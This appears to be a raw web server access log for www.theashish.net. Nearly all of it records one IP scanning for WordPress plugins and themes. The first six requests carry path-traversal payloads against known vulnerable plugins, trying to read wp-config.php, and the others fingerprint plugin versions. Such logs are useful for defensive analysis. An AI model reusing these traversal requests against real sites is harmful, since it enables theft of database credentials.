78.47.93.204 - - [26/Oct/2022:08:51:04 -0700] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:51:09 -0700] "GET /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:51:25 -0700] "GET /wp-admin/admin-ajax.php?action=handle_downloads&alg_wc_pif_download_file=../../../../../wp-config.php HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:51:39 -0700] "GET /wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:51:53 -0700] "GET /wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=../../../../../../wp-config.php HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:52:04 -0700] "GET /wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=../../../../wp-config.php HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:52:18 -0700] "GET /wp-content/plugins/tatsu/changelog.md HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:52:28 -0700] "GET /wp-content/plugins/udraw/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:52:40 -0700] "GET /wp-content/plugins/woo-product-table/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:52:49 -0700] "GET /wp-content/plugins/wpcargo/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:53:02 -0700] "GET /wp-content/plugins/nd-learning/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:53:15 -0700] "GET /wp-content/plugins/nd-shortcodes/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:53:28 -0700] "GET /wp-content/plugins/nd-booking/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:53:41 -0700] "GET /wp-content/plugins/nd-donations/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:53:54 -0700] "GET /wp-content/plugins/nd-restaurant-reservations/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:54:00 -0700] "GET /wp-content/plugins/sitemap-by-click5/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:54:09 -0700] "GET /wp-content/plugins/wp-user-avatar/changelog.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:54:20 -0700] "GET / HTTP/1.1" 200 4079 "https://www.google.com" "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:54:35 -0700] "GET /wp-content/plugins/quiz-master-next/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:54:51 -0700] "GET /wp-content/plugins/wp-live-chat-support-pro/css/wplc_styles_pro.css HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:55:07 -0700] "GET /wp-content/plugins/armember-membership/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:55:22 -0700] "GET /wp-content/plugins/ninja-forms/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:55:33 -0700] "GET /wp-content/plugins/ultimate-member/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:55:45 -0700] "GET /wp-content/plugins/wpgateway/css/style.css HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:55:59 -0700] "GET /wp-content/themes/workreap/style.css HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:56:16 -0700] "GET /wp-content/plugins/scripts-organizer/plugins/meta-box/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:56:27 -0700] "GET /wp-content/plugins/alphabetic-pagination/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:56:42 -0700] "GET /wp-content/plugins/all-in-one-video-gallery/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.0.0 Mobile Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:56:49 -0700] "GET /wp-content/plugins/directorist/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:57:03 -0700] "GET /wp-content/plugins/simply-schedule-appointments/readme.txt HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
78.47.93.204 - - [26/Oct/2022:08:57:14 -0700] "GET /wp-content/themes/greyd_suite/style.css HTTP/1.1" 404 88 "https://www.google.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "www.theashish.net"
54.190.137.252 - - [26/Oct/2022:10:11:03 -0700] "GET / HTTP/1.1" 200 4079 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" "theashish.net"
